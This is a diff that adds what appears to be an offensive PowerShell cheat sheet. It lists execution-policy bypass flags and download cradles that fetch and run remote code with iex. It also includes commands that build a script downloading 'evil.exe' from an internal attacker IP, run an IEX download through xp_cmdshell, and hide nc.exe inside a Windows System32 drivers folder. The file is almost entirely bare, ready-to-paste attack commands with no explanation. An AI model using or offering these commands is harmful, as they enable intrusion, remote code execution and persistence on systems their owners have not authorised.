@@ -1,0 +1,25 @@
+EXECUTION POLICY
+powershell -ExecutionPolicy bypass
+powershell -c
+powershell -EP bypass
+powershell.exe -nop -exec bypass
+powershell encondedcomand $env:PSExecutionPolicyPreference="bypass"
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive NoProfile -File wget.ps1 
+
+DOWNLOAD
+iex (New-Object Net.WebClient).DownloadString('')
+$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+PSv3 onwards - iex (iwr '')
+$h = New-Object -ComObject mSXM12.xmlhttp;$H.OPEN('GET','',$false);$h.send();iex $h.responseText
+$wr = [System.NET.WebRequest]::Create("")
+$r = $wr.GetResponse()
+IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
+echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1 
+echo $file = "new-exploit.exe" >>wget.ps1 
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"http\!)
+Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip" 
+(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 
+powershell -command Invoke-WebRequest http://10.10.xx.xx/nc.exe -OutFile C:\Windows\System32\spool\drivers\color\nc.exe
